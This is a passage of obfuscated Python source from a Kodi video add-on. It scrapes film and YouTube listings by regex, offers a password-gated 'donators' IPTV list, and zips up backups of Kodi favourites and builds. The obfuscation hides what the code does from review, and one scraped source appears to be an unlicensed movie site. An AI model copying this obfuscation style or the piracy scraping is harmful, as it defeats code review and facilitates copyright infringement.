 oOOoo00O00o = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 O0O00Oo = 'http://imoviemax.se/?s=' + ( oOOoo00O00o ) . replace ( ' ' , '+' )
 oooooo0O000o = O0O00Oo . lower ( )
 OoO ( oooooo0O000o )
def ooO0O0O0ooOOO ( url ) :
 oOOo0O00o = [ ]
 OO00O0O = iii ( url )
 oOooOOOoOo = re . compile ( '<li class="cat-item cat-item-.+? "><a href="(.+?)">(.+?)</a><i>(.+?)</i></li>' ) . findall ( OO00O0O )
 for url , i1I1I , iIiIi11 in oOooOOOoOo :
  if i1I1I in oOOo0O00o :
   pass
  else :
   O0Oo000ooO00 ( i1I1I + ' - ' + iIiIi11 + ' Films' , url , 10074 , ii11iIi1I + 'genievision.png' , i1iiIII111ii , '' )
   oOOo0O00o . append ( i1I1I )
   if 87 - 87: Oo . OOOo0 - OoOoOO00 + O0 / Oo / ii
def IiI ( url ) :
 OO00O0O = iii ( url )
 oOooOOOoOo = re . compile ( '<li>.+?<b>.+?</b>.+?<a href="(.+?)">(.+?)</a>.+?<span>(.+?)</span>' , re . DOTALL ) . findall ( OO00O0O )
 for url , i1I1I , IIIii1I in oOooOOOoOo :
  O0Oo000ooO00 ( i1I1I + ' - Views:' + IIIii1I , url , 10075 , ii11iIi1I + 'genievision.png' , i1iiIII111ii , '' )
  if 97 - 97: O0 + I1IiI
  if 89 - 89: OOooOOo + Ooo00oOo00o * OOOO00ooo0Ooo * OOooOooo
def OoO ( url ) :
 iiIiI1i1 = [ ]
 OO00O0O = iii ( url )
 next = re . compile ( "<link rel='next' href='(.+?)' />" ) . findall ( OO00O0O )
 for next in next :
  O0Oo000ooO00 ( 'NEXT PAGE' , next , 10074 , ii11iIi1I + 'Next.png' , i1iiIII111ii , '' )
 oOooOOOoOo = re . compile ( '<div class="movie">.+?<img src="(.+?)" alt="(.+?)" />.+?<a href="(.+?)"><span class="player"></span></a>' , re . DOTALL ) . findall ( OO00O0O )
 for oO0O00oOOoooO , i1I1I , url in oOooOOOoOo :
  O0Oo000ooO00 ( i1I1I , url , 10075 , oO0O00oOOoooO , oO0O00oOOoooO , '' )
  iiIiI1i1 . append ( i1I1I )
  if 46 - 46: OOOo0 - OoooooooOO - OOOO00ooo0Ooo * OoOoOO00
def I1i1I11I ( img , name , url ) :
 img = img
 name = name
 OO00O0O = iii ( url )
 oOooOOOoOo = re . compile ( '<div id="(.+?)" class="player-content"><iframe class="playerframe" src="(.+?)" scrolling="no".+?</iframe></div>' ) . findall ( OO00O0O )
 for OoO000O0Oo , url in oOooOOOoOo :
  print '>>>>>>>>>>>>>>>>>>>>>>>>>>> before' + url
  Oo0o0oooo0O0 = ( url ) . replace ( 'player' , 'watch' ) + '&fv=&sou='
  print '<<<<<<<<<<<<<<<<<<<<<<<<<<< after' + Oo0o0oooo0O0
  OooooOOoo0 = ( OoO000O0Oo ) . replace ( 'play-' , 'Server ' )
  O00OOOoOoo0O ( OooooOOoo0 , Oo0o0oooo0O0 , 10076 , img , img , '' )
  if 35 - 35: OOOO00ooo0Ooo % Ii11I - ii
def ii1iii1i ( url ) :
 OO00O0O = iii ( url )
 oOooOOOoOo = re . compile ( '<source src="(.+?)" type="video/mp4">' ) . findall ( OO00O0O )
 for Iii1I1111ii in oOooOOOoOo :
  if '=m' in Iii1I1111ii :
   ooOoO00 ( Iii1I1111ii )
  elif 'php' in Iii1I1111ii :
   ii1iii1i ( url )
  else :
   OO00O0O = iii ( Iii1I1111ii )
   oOooOOOoOo = re . compile ( 'content="(.+?)">' ) . findall ( OO00O0O )
   for Ii1IIiI1i in oOooOOOoOo :
    ooOoO00 ( Iii1I1111ii )
    if 78 - 78: ii11ii1ii
    if 93 - 93: i1i1i11IIi * OoooooooOO + OO0O
    if 33 - 33: O0 * OOooOOo - o0OOOoO0 % o0OOOoO0
def I11I ( url ) :
 OO00O0O = iii ( url )
 I11iIi1i1II11 = re . compile ( '<td id=".+?" class="today">.+?title="(.+?)">(.+?)</td>' , re . DOTALL ) . findall ( OO00O0O )
 for O0oo00o0O , iiI in I11iIi1i1II11 :
  print 'there ><><><><><><><><><><><><'
  O0oo00o0O = O0oo00o0O
  oOooOOOoOo = re . compile ( '<p><a href=".+?" rel=".+?">(.+?)</a>.+?<br /><a href=".+?">(.+?)</a>.+?</p>' , re . DOTALL ) . findall ( str ( iiI ) )
  for i1I1I , iiI1I in oOooOOOoOo :
   print 'here <><><><><><><><><><><><>'
   O0Oo000ooO00 ( '[COLORred]' + O0oo00o0O + '[/COLOR] - ' + i1I1I + ' - [COLORgreen]' + iiI1I + '[/COLOR]' , i1111 ( 'aHR0cDovL3d3dy5wb2dkZXNpZ24uY28udWsvY2F0Lw==' ) , 10070 , ii11iIi1I + 'loader.png' , i1iiIII111ii , '' )
 I1Ii = re . compile ( '<td id=".+?" class="day">.+?title="(.+?)">(.+?)</td>' , re . DOTALL ) . findall ( OO00O0O )
 for O0oo00o0O , i1I1i111Ii in I1Ii :
  print 'there ><><><><><><><><><><><><'
  O0oo00o0O = O0oo00o0O
  oOooOOOoOo = re . compile ( '<p><a href=".+?" rel=".+?">(.+?)</a>.+?<br /><a href=".+?">(.+?)</a>.+?</p>' , re . DOTALL ) . findall ( str ( i1I1i111Ii ) )
  for i1I1I , iiI1I in oOooOOOoOo :
   print 'here <><><><><><><><><><><><>'
   O0Oo000ooO00 ( '[COLORred]' + O0oo00o0O + '[/COLOR] - ' + i1I1I + ' - [COLORgreen]' + iiI1I + '[/COLOR]' , i1111 ( 'aHR0cDovL3d3dy5wb2dkZXNpZ24uY28udWsvY2F0Lw==' ) , 10070 , ii11iIi1I + 'loader.png' , i1iiIII111ii , '' )
   if 67 - 67: OOOo0 . i1IIi
   if 27 - 27: OO0O % OOOo0
   if 73 - 73: Ii11I
def ooO ( url ) :
 OO00O0O = iii ( url )
 I1Ii = re . compile ( '<li class="yt-uix-scroller-scroll-unit "(.+?)</li>' , re . DOTALL ) . findall ( OO00O0O )
 for I1Ii in I1Ii :
  i1I1I = re . compile ( 'data-video-title="(.+?)"' ) . findall ( str ( I1Ii ) )
  for i1I1I in i1I1I :
   i1I1I = ( i1I1I ) . replace ( '&quot;' , '' ) . replace ( '&#39;' , '\'' ) . replace ( '&amp;' , '&' )
  url = re . compile ( '<a href="/w(.+?)&' ) . findall ( str ( I1Ii ) )
  for url in url :
   url = 'https://www.youtube.com/w' + url
  Ooo0oOooo0 = re . compile ( '<img.+?="(.+?)"' ) . findall ( str ( I1Ii ) )
  for Ooo0oOooo0 in Ooo0oOooo0 :
   Ooo0oOooo0 = 'http:' + Ooo0oOooo0
  O00OOOoOoo0O ( '[COLORgreen]' + i1I1I + '[/COLOR]' , ( url ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , Ooo0oOooo0 , '' , '' )
  if 61 - 61: I1IiI - Ii11I - i1IIi
  if 25 - 25: O0 * OOOO00ooo0Ooo + ii11ii1ii . OOooOOo . OOooOOo
  if 58 - 58: OOOo0
  if 53 - 53: i1IIi
def o0OOOoO0o0OoOo00o0o ( url ) :
 if 41 - 41: OO0O % Ooo00oOo00o - Oo * o0OOOoO0 * Oo
 OOOoOO0o = [ ]
 OO00O0O = iii ( url )
 oOooOOOoOo = re . compile ( '<div class="explore-list">.+?<div class="el-img"><a href="(.+?)" class=".+?"><img src="(.+?)" alt=".+?<h3>(.+?)</h3><p>(.+?)</p></div>' , re . DOTALL ) . findall ( OO00O0O )
 for Iii1I1111ii , oO0O00oOOoooO , i1I1I , i1II1 in oOooOOOoOo :
  i1I1I = ( i1I1I ) . replace ( '&#039;' , '\'' ) . replace ( '&amp;' , '&' ) . replace ( '&quot;' , '"' )
  i11i1 = iii ( Iii1I1111ii )
  IiiiiI1i1Iii = re . compile ( '<!-- # player # -->.+?<iframe title=".+?".+?src="http://www.youtube.com/embed/(.+?)?autohide.+?<!-- detail box -->(.+?)</div>' , re . DOTALL ) . findall ( i11i1 )
  for oo00oO0o , iiii111II in IiiiiI1i1Iii :
   I11iIiI1I1i11 = re . compile ( '<p>(.+?)</p>' , re . DOTALL ) . findall ( str ( iiii111II ) )
   for OOoooO00o0oo0 in I11iIiI1I1i11 :
    if i1I1I in OOOoOO0o :
     pass
    else :
     O00OOOoOoo0O ( i1I1I , oo00oO0o , 8043 , oO0O00oOOoooO , oO0O00oOOoooO , OOoooO00o0oo0 )
     ooOoOO0oo0O ( 'movies' , 'INFO' )
     OOOoOO0o . append ( i1I1I )
     if 61 - 61: OOooOooo / ii11ii1ii % i1i1i11IIi + OO0O / o0OOOoO0 . OO0O
     if 12 - 12: i1IIi + i1IIi - ii11ii1ii * Oo % Oo - OoOoOO00
def o0O ( url ) :
 OOOooo = OooO0OO ( url )
 oOooOOOoOo = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( OOOooo )
 for url , o0OOo0o0O0O , OOoooO00o0oo0 , o0OO0o0oOOO0O , i1I1I in oOooOOOoOo :
  O0Oo000ooO00 ( i1I1I , url , 10065 , o0OOo0o0O0O , o0OO0o0oOOO0O , OOoooO00o0oo0 )
 ooOoOO0oo0O ( 'movies' , 'INFO' )
 if 49 - 49: ii11ii1ii . OOooOOo . OoOoOO00
def o000ooooO0o ( ) :
 oOOoo00O00o = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 O0O00Oo = 'https://www.youtube.com/results?search_query=' + ( oOOoo00O00o ) . replace ( ' ' , '+' )
 oooooo0O000o = O0O00Oo . lower ( )
 OO00O0O = iii ( oooooo0O000o )
 oOooOOOoOo = re . compile ( '<img src="(.+?)" alt=.+?yt-lockup-title "><a href="(.+?)".+?data-sessionlink=.+?" title="(.+?)".+?<span class="accessible-description".+?>(.+?)</span>.+?<div class="yt-lockup-description yt-ui-ellipsis yt-ui-ellipsis-2" dir="ltr">(.+?)</div>' , re . DOTALL ) . findall ( OO00O0O )
 next = re . compile ( '<a href="(.+?)" class="yt-uix-button.+?class="yt-uix-button-content">Next.+?</span></a>' ) . findall ( OO00O0O )
 for iI1i11 in next :
  iI1i11 = 'https://www.youtube.com' + iI1i11
  O0Oo000ooO00 ( '[COLORgreen] NEXT [/COLOR]' , iI1i11 , 10065 , ii11iIi1I + 'Next.png' , i1iiIII111ii , '' )
 for oO0O00oOOoooO , iI1i11 , i1I1I , OoOOoooOO0O , iiii111II in oOooOOOoOo :
  Ooo . append ( i1I1I )
  ooOoOO0oo0O ( 'tvshows' , 'INFO' )
  Ooo0oOooo0 = 'http:' + ( oO0O00oOOoooO ) . replace ( 'https:' , '' )
  print '>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>' + Ooo0oOooo0
  iI1i11 = 'http://www.youtube.com' + iI1i11
  O00OOOoOoo0O ( '[COLORred]' + OoOOoooOO0O + '[/COLOR]' + '[COLORgreen]' + i1I1I + '[/COLOR]' , ( iI1i11 ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , Ooo0oOooo0 , Ooo0oOooo0 , iiii111II )
 else :
  oOooOOOoOo = re . compile ( '<img src="(.+?)" alt=.+?yt-lockup-title "><a href="(.+?)".+?data-sessionlink=.+?" title="(.+?)".+?<span class="accessible-description".+?>(.+?)</span>' , re . DOTALL ) . findall ( OO00O0O )
  for oO0O00oOOoooO , iI1i11 , i1I1I , OoOOoooOO0O in oOooOOOoOo :
   print 'im doing it'
   ooOoOO0oo0O ( 'tvshows' , 'INFO' )
   Ooo0oOooo0 = 'http:' + ( oO0O00oOOoooO ) . replace ( 'https:' , '' )
   iI1i11 = 'http://www.youtube.com' + iI1i11
   if '&' in iI1i11 :
    print ' i got here'
    OO00O0O = iii ( iI1i11 )
    I1Ii = re . compile ( '<li class="yt-uix-scroller-scroll-unit "(.+?)</li>' , re . DOTALL ) . findall ( OO00O0O )
    for I1Ii in I1Ii :
     i1I1I = re . compile ( 'data-video-title="(.+?)"' ) . findall ( str ( I1Ii ) )
     for i1I1I in i1I1I :
      i1I1I = ( i1I1I ) . replace ( '&quot;' , '' ) . replace ( '&#39;' , '\'' ) . replace ( '&amp;' , '&' )
     iI1i11 = re . compile ( '<a href="/w(.+?)&' ) . findall ( str ( I1Ii ) )
     for iI1i11 in iI1i11 :
      iI1i11 = 'https://www.youtube.com/w' + iI1i11
     Ooo0oOooo0 = re . compile ( '<img.+?="(.+?)"' ) . findall ( str ( I1Ii ) )
     for Ooo0oOooo0 in Ooo0oOooo0 :
      Ooo0oOooo0 = 'http:' + Ooo0oOooo0
     O00OOOoOoo0O ( '[COLORred]' + OoOOoooOO0O + '[/COLOR]' + '[COLORgreen]' + i1I1I + '[/COLOR]' , ( iI1i11 ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , Ooo0oOooo0 , i1iiIII111ii , '' )
   elif i1I1I in Ooo :
    pass
   elif 'user' in iI1i11 or 'elete' in i1I1I :
    pass
   elif 'hannel' in iI1i11 :
    print '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~' + iI1i11
    OO00O0O = iii ( iI1i11 )
    ooo00Ooo = re . compile ( 'data-thumb="(.+?)".+?href="(.+?)">(.+?)</a>' , re . DOTALL ) . findall ( OO00O0O )
    for oO0O00oOOoooO , iI1i11 , i1I1I in ooo00Ooo :
     if 'outube' in iI1i11 or 'list' in iI1i11 :
      pass
     elif 'atch' in iI1i11 :
      iI1i11 = ( iI1i11 ) . replace ( '/watch?v=' , '' )
      O00OOOoOoo0O ( '[COLORred]' + OoOOoooOO0O + '[/COLOR]' + '[COLORgreen]' + i1I1I + '[/COLOR]' , ( iI1i11 ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , 'http:' + oO0O00oOOoooO , 'http:' + oO0O00oOOoooO , '' )
     else :
      pass
   else :
    O00OOOoOoo0O ( '[COLORred]' + OoOOoooOO0O + '[/COLOR]' + '[COLORgreen]' + i1I1I + '[/COLOR]' , ( iI1i11 ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , Ooo0oOooo0 , Ooo0oOooo0 , '' )
    if 93 - 93: i11iIiiIii - OOOo0 * ii11ii1ii * OOOO00ooo0Ooo % O0 + OoooooooOO
def I1i1i1 ( url ) :
 OO00O0O = iii ( url )
 oOooOOOoOo = re . compile ( '<img src="(.+?)" alt=.+?yt-lockup-title "><a href="(.+?)".+?data-sessionlink=.+?" title="(.+?)".+?<span class="accessible-description".+?>(.+?)</span>.+?<div class="yt-lockup-description yt-ui-ellipsis yt-ui-ellipsis-2" dir="ltr">(.+?)</div>' , re . DOTALL ) . findall ( OO00O0O )
 next = re . compile ( '<a href="(.+?)" class="yt-uix-button.+?class="yt-uix-button-content">Next.+?</span></a>' ) . findall ( OO00O0O )
 for url in next :
  url = 'https://www.youtube.com' + url
  O0Oo000ooO00 ( '[COLORgreen] NEXT [/COLOR]' , url , 10065 , ii11iIi1I + 'Next.png' , i1iiIII111ii , '' )
 for oO0O00oOOoooO , url , i1I1I , OoOOoooOO0O , iiii111II in oOooOOOoOo :
  Ooo . append ( i1I1I )
  ooOoOO0oo0O ( 'tvshows' , 'INFO' )
  Ooo0oOooo0 = 'http:' + ( oO0O00oOOoooO ) . replace ( 'https:' , '' )
  print '>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>' + Ooo0oOooo0
  url = 'http://www.youtube.com' + url
  O00OOOoOoo0O ( '[COLORred]' + OoOOoooOO0O + '[/COLOR]' + '[COLORgreen]' + i1I1I + '[/COLOR]' , ( url ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , Ooo0oOooo0 , Ooo0oOooo0 , iiii111II )
 else :
  oOooOOOoOo = re . compile ( '<img src="(.+?)" alt=.+?yt-lockup-title "><a href="(.+?)".+?data-sessionlink=.+?" title="(.+?)".+?<span class="accessible-description".+?>(.+?)</span>' , re . DOTALL ) . findall ( OO00O0O )
  for oO0O00oOOoooO , url , i1I1I , OoOOoooOO0O in oOooOOOoOo :
   ooOoOO0oo0O ( 'tvshows' , 'INFO' )
   Ooo0oOooo0 = 'http:' + ( oO0O00oOOoooO ) . replace ( 'https:' , '' )
   url = 'http://www.youtube.com' + url
   if '&' in url :
    OO00O0O = iii ( url )
    I1Ii = re . compile ( '<li class="yt-uix-scroller-scroll-unit "(.+?)</li>' , re . DOTALL ) . findall ( OO00O0O )
    for I1Ii in I1Ii :
     i1I1I = re . compile ( 'data-video-title="(.+?)"' ) . findall ( str ( I1Ii ) )
     for i1I1I in i1I1I :
      i1I1I = ( i1I1I ) . replace ( '&quot;' , '' ) . replace ( '&#39;' , '\'' ) . replace ( '&amp;' , '&' )
     url = re . compile ( '<a href="/w(.+?)&' ) . findall ( str ( I1Ii ) )
     for url in url :
      url = 'https://www.youtube.com/w' + url
     Ooo0oOooo0 = re . compile ( '<img.+?="(.+?)"' ) . findall ( str ( I1Ii ) )
     for Ooo0oOooo0 in Ooo0oOooo0 :
      Ooo0oOooo0 = 'http:' + Ooo0oOooo0
     O00OOOoOoo0O ( '[COLORred]' + OoOOoooOO0O + '[/COLOR]' + '[COLORgreen]' + i1I1I + '[/COLOR]' , ( url ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , Ooo0oOooo0 , i1iiIII111ii , '' )
   elif i1I1I in Ooo :
    pass
   elif 'user' in url or 'elete' in i1I1I :
    pass
   elif 'hannel' in url :
    print '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~' + url
    OO00O0O = iii ( url )
    ooo00Ooo = re . compile ( 'data-thumb="(.+?)".+?href="(.+?)">(.+?)</a>' , re . DOTALL ) . findall ( OO00O0O )
    for oO0O00oOOoooO , url , i1I1I in ooo00Ooo :
     if 'outube' in url or 'list' in url :
      pass
     elif 'atch' in url :
      url = ( url ) . replace ( '/watch?v=' , '' )
      O00OOOoOoo0O ( '[COLORred]' + OoOOoooOO0O + '[/COLOR]' + '[COLORgreen]' + i1I1I + '[/COLOR]' , ( url ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , 'http:' + oO0O00oOOoooO , 'http:' + oO0O00oOOoooO , '' )
     else :
      pass
   else :
    O00OOOoOoo0O ( '[COLORred]' + OoOOoooOO0O + '[/COLOR]' + '[COLORgreen]' + i1I1I + '[/COLOR]' , ( url ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , Ooo0oOooo0 , Ooo0oOooo0 , '' )
    if 73 - 73: O0 * O00oo0OO0oOOO + OOooOooo + OO0O
    if 40 - 40: OoOoOO00 . I1IiI * o0OOOoO0 + Ii11I + Ii11I
def I1ii1I1iiii ( ) :
 if oo0o0O00 == 'insert_password' :
  oOOoo00O0O . ok ( '[COLORgreen]Donators Login[/COLOR]' , 'You need to set username and password to access this' , 'These are unique and provided to donators to help with server and stream costs' , 'Donate @ [COLORgreen]http://architects.x10host.com[/COLOR]' )
  o0oO0 . openSettings ( sys . argv [ 0 ] )
 else :
  iiIoO = open ( o0 )
  oOooOOOoOo = re . compile ( 'plugin.video.GenieTv.+?2Flive%2F(.+?)%2F(.+?)%2F' ) . findall ( str ( iiIoO ) )
  for IIiIi , OOoOooOoOOOoo in oOooOOOoOo :
   if IIiIi == 'needs replacing' or OOoOooOoOOOoo == 'needs replacing' :
    Iiii1iI1i ( )
  O0Oo000ooO00 ( '[COLORgreen]DONATORS LIST[/COLOR]' , iiI1IiI + '/thelist.m3u' , 7080 , ii11iIi1I + 'GTVIPTV.png' , i1iiIII111ii , '' )
  if 34 - 34: OO0O * OOOo0 . i1IIi * OO0O / OO0O
def IIiI1Ii ( ) :
 i1iiIIiiI111 . ok ( '[COLOR=white]ReCreate Addons.ini[/COLOR]' , 'If it doesnt work ensure login details are correct and retry' , '' , 'This will allow access to streams in guide without linking to favourites' )
 i1iiIIiiI111 . ok ( '[COLOR=red]Reset Any Previous linked streams[/COLOR]' , 'For best results you\'ll need to clear previous linked streams' , 'Go to TVGuide tab then reset database at the bottom' , 'Then go back and guide should be all linked up and ready to go' )
 o0oO0 . openSettings ( sys . argv [ 0 ] )
 Iiii1iI1i ( )
 i1iiIIiiI111 . ok ( '[COLOR=yellow]Done[/COLOR]' , 'Done' , 'Easy as that' , 'Now Go to guide and it should link your GTV streams' )
 if 57 - 57: Ii11I - OO0O - OOOO00ooo0Ooo + Ooo00oOo00o
def I1IIIiI11i1 ( ) :
 try :
  i11I1I1I = gui . TVGuide ( )
  i11I1I1I . doModal ( )
  del i11I1I1I
  if 64 - 64: OOooOooo
 except :
  import sys
  import traceback as tb
  ( oo00O00Oo , IIIII1II , traceback ) = sys . exc_info ( )
  tb . print_exception ( oo00O00Oo , IIIII1II , traceback )
  if 35 - 35: iIii1I11I1II1
def I1i ( ) :
 O0Oo000ooO00 ( 'Full Backup' , '' , 10061 , ii11iIi1I + 'Backup.png' , i1iiIII111ii , 'Back Up Your Full System' )
 if os . path . exists ( oOoOooOo0o0 ) :
  O0Oo000ooO00 ( 'Backup Genie Favourites' , iI1i11 , 10062 , ii11iIi1I + 'Backup.png' , i1iiIII111ii , 'Back Up Your favourites' )
 if os . path . exists ( IIiiiiiiIi1I1 ) :
  O0Oo000ooO00 ( 'Backup Ivue Config' , IIiiiiiiIi1I1 , 10062 , ii11iIi1I + 'Backup.png' , i1iiIII111ii , 'Back Up Your master.db' )
 if os . path . exists ( I1IIIii ) :
  O0Oo000ooO00 ( 'Backup Kodi Favourites' , I1IIIii , 10062 , ii11iIi1I + 'Backup.png' , i1iiIII111ii , 'Back Up Your favourites.xml' )
  if 32 - 32: I1IiI / Ooo00oOo00o + Ii11I
  if 32 - 32: iIii1I11I1II1 % O00oo0OO0oOOO
  if 65 - 65: OO0O . OoooooooOO / ii11ii1ii . i1IIi * Ooo00oOo00o
zip = o0oO0 . getSetting ( 'zip' )
IiIiII1 = xbmc . translatePath ( os . path . join ( zip ) )
def Iii1iiIi1II ( ) :
 OO0O00oOo = xbmc . translatePath ( os . path . join ( zip , 'testCBFolder' ) )
 if not os . path . exists ( zip ) :
  i1iiIIiiI111 . ok ( '[COLOR=white]Origin[/COLOR]' , 'The download location you have stored does not exist .\nPlease update the addon settings and try again.' , '' , '' )
  o0oO0 . openSettings ( sys . argv [ 0 ] )
  if 14 - 14: OOOo0
  if 19 - 19: Ooo00oOo00o - Oo . ii / ii % OO0O
  if 56 - 56: OOOo0 . O0 + Oo
def i1II1I1Iii1 ( name , url , description ) :
 if 'Backup' in name :
  if 'Genie' in name :
   url = oOoOooOo0o0
  elif 'Ivue' in name :
   url = IIiiiiiiIi1I1
  elif 'Kodi' in name :
   url = I1IIIii
  Iii1iiIi1II ( )
  iiI11Iii = open ( url ) . read ( )
  O0o0O0 = os . path . join ( IiIiII1 , description . split ( 'Your ' ) [ 1 ] )
  Ii1II1I11i1 = open ( O0o0O0 , mode = 'w' )
  Ii1II1I11i1 . write ( iiI11Iii )
  Ii1II1I11i1 . close ( )
 else :
  if 'guisettings.xml' in description :
   oOoooooOoO = open ( os . path . join ( IiIiII1 , description . split ( 'Your ' ) [ 1 ] ) ) . read ( )
   Ii111 = '<setting type="(.+?)" name="%s.(.+?)">(.+?)</setting>' % skin
   oOooOOOoOo = re . compile ( Ii111 ) . findall ( oOoooooOoO )
   for type , I111i1i1111 , IIII1 in oOooOOOoOo :
    IIII1 = IIII1 . replace ( '&quot;' , '' ) . replace ( '&amp;' , '&' )
    xbmc . executebuiltin ( "Skin.Se	t%s(%s,%s)" % ( type . title ( ) , I111i1i1111 , IIII1 ) )
  else :
   O0o0O0 = os . path . join ( url )
   iiI11Iii = open ( os . path . join ( IiIiII1 , description . split ( 'Your ' ) [ 1 ] ) ) . read ( )
   Ii1II1I11i1 = open ( O0o0O0 , mode = 'w' )
   Ii1II1I11i1 . write ( iiI11Iii )
   Ii1II1I11i1 . close ( )
 i1iiIIiiI111 . ok ( "[COLOR=white]Origin[/COLOR]" , "" , 'All Done !' , '' )
 if 10 - 10: o0OOOoO0 / OO0O + i11iIiiIii / OOooOooo
 if 74 - 74: Ii11I + O0 + i1IIi - i1IIi + OoOoOO00
 if 83 - 83: ii11ii1ii - OOOo0 + Ii11I
 if 5 - 5: OOooOooo
def iIi1i1iIi1iI ( ) :
 iiIi1iI1iIii = 1
 Iii1iiIi1II ( )
 o00OooO0oo = xbmc . translatePath ( os . path . join ( IiIiII1 , 'Build Backup' , 'Full Backup' , '' ) )
 o0o0oOoOO0O = xbmc . translatePath ( os . path . join ( IiIiII1 , 'Build Backup' , 'my_full_backup.zip' ) )
 i1ii1II1ii = xbmc . translatePath ( os . path . join ( IiIiII1 , 'Build Backup' , 'my_full_backup_GUI_Settings.zip' ) )
 if not os . path . exists ( o00OooO0oo ) :
  os . makedirs ( o00OooO0oo )
 iII111Ii = oOOoo00O0O . input ( 'Enter a name for this backup' , type = xbmcgui . INPUT_ALPHANUM )
 if ( not iII111Ii ) : return False , 0
 Ooo00OoOOO = iII111Ii
 Oo0OO0000oooo = xbmc . translatePath ( os . path . join ( o00OooO0oo , Ooo00OoOOO + '.zip' ) )
 IIII1iII = [ 'plugin.video.GenieTv' ]
 ii1III11 = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' ]
 I1iiIIIi11 = [ 'plugin.video.GenieTv' , 'repository.origin' , 'cache' , 'system' , 'Thumbnails' , "peripheral_data" , 'library' , 'keymaps' ]
 Ii1I11ii1i = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , "Textures13.db" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , 'advancedsettings.xml' ]
 O0iIiIIIIIii = "Creating full backup of existing build"
 OOo0 = "Creating Community Build"
 ii11I1 = "Archiving..."
 oO0oo = ""
 Ii111iIi1iIi = "Please Wait"
 IIIIIo0ooOoO000oO ( oooOOOOO , Oo0OO0000oooo , OOo0 , ii11I1 , oO0oo , Ii111iIi1iIi , I1iiIIIi11 , Ii1I11ii1i )
 time . sleep ( 1 )
 OOo = xbmc . translatePath ( os . path . join ( o00OooO0oo , Ooo00OoOOO + '_guisettings.zip' ) )
 i1i11I1I1iii1 = zipfile . ZipFile ( OOo , mode = 'w' )
 try :
  i1i11I1I1iii1 . write ( xbmc . translatePath ( os . path . join ( oooOOOOO , 'userdata' , 'profiles.xml' ) ) , 'profiles.xml' , zipfile . ZIP_DEFLATED )
 except : pass
 i1i11I1I1iii1 . close ( )
 if iiIi1iI1iIii == 0 :
  i1iiIIiiI111 . ok ( "FAILED!" , 'The guisettings.xml file could not be found on your' , 'system, please reboot and try again.' , '' )
 else :
  i1iiIIiiI111 . ok ( "SUCCESS!" , 'You Are Now Backed Up. If you\'d like to share this build with' , 'the community please post details on the forum at' , '[COLOR=blue][B]http://rh-project.info[/COLOR][/B]' )
  i1iiIIiiI111 . ok ( "Build Locations" , 'Full Backup (only used to restore on this device): [COLOR=yellow]' + o0o0oOoOO0O , '[/COLOR]Universal Backup (can be used on any device): [COLOR=yellow]' + Oo0OO0000oooo + '[/COLOR]' )
  if 8 - 8: OO0O + OoOoOO00 / O00oo0OO0oOOO / OOOO00ooo0Ooo
def IIIIIo0ooOoO000oO ( sourcefile , destfile , message_header , message1 , message2 , message3 , exclude_dirs , exclude_files ) :
 ooo0O = zipfile . ZipFile ( destfile , 'w' , zipfile . ZIP_DEFLATED )
 iII1iii = len ( sourcefile )
 i11i1iiiII = [ ]
 ooOO0oO0oo00o = [ ]
 Oo0oO0ooo . create ( message_header , message1 , message2 , message3 )
 for oOOo0oo0O , IiiIiI1Ii1i , i1iIi in os . walk ( sourcefile ) :
  for file in i1iIi :
   ooOO0oO0oo00o . append ( file )
 iiiii1II = len ( ooOO0oO0oo00o )
 for oOOo0oo0O , IiiIiI1Ii1i , i1iIi in os . walk ( sourcefile ) :
  IiiIiI1Ii1i [ : ] = [ O0OOO0OOooo00 for O0OOO0OOooo00 in IiiIiI1Ii1i if O0OOO0OOooo00 not in exclude_dirs ]
  i1iIi [ : ] = [ Ii1II1I11i1 for Ii1II1I11i1 in i1iIi if Ii1II1I11i1 not in exclude_files ]
  for file in i1iIi :
   i11i1iiiII . append ( file )
   I111iIi1 = len ( i11i1iiiII ) / float ( iiiii1II ) * 100
   Oo0oO0ooo . update ( int ( I111iIi1 ) , "Backing Up" , '[COLOR yellow]%s[/COLOR]' % file , 'Please Wait' )
   oo00O00oO000o = os . path . join ( oOOo0oo0O , file )
   if not 'temp' in IiiIiI1Ii1i :
    if not 'plugin.program.originwizard' in IiiIiI1Ii1i :
     import time
     OOo00OoO = '01/01/1980'
     iIi1 = time . strftime ( '%d/%m/%Y' , time . gmtime ( os . path . getmtime ( oo00O00oO000o ) ) )
     if iIi1 > OOo00OoO :
      ooo0O . write ( oo00O00oO000o , oo00O00oO000o [ iII1iii : ] )
 ooo0O . close ( )
 Oo0oO0ooo . close ( )
 if 21 - 21: OOOO00ooo0Ooo
 if 92 - 92: i11iIiiIii / o0OOOoO0 - O00oo0OO0oOOO % OO0O * o0OOOoO0 + Oo
def ii1 ( ) :
 oOooOOo00Oo0O ( )
